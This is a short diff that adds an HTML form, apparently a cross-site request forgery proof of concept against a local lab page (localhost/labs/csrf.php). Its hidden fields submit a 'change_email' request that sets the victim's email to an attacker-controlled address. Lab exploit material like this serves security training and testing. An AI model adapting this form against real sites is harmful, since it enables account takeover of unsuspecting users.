@@ -1,0 +1,5 @@
+<form method="post" action="http://localhost/labs/csrf.php">
+  <input type="hidden" name="form_action" value="change_email">
+  <input type="hidden" name="email" value="attacker-controlled@evil.test">
+  <button type="submit">submit</button>
+</form>
